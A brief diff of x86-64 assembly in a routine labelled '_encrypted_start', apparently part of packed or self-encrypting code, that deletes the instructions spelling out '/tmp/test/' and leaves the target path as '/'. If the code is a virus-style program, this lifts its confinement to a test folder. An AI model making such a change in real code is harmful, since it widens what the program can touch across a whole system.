@@ -46,24 +46,6 @@ _encrypted_start:
 
 	mov		[rax], byte '/'
 	inc		rax
-	mov		[rax], byte 't'
-	inc		rax
-	mov		[rax], byte 'm'
-	inc		rax
-	mov		[rax], byte 'p'
-	inc		rax
-	mov		[rax], byte '/'
-	inc		rax
-	mov		[rax], byte 't'
-	inc		rax
-	mov		[rax], byte 'e'
-	inc		rax
-	mov		[rax], byte 's'
-	inc		rax
-	mov		[rax], byte 't'
-	inc		rax
-	mov		[rax], byte '/'
-	inc		rax
 	jmp	[rel .addr1r]
 	.addr1: dq 0x421900000001
 	.addr1r: dq 0
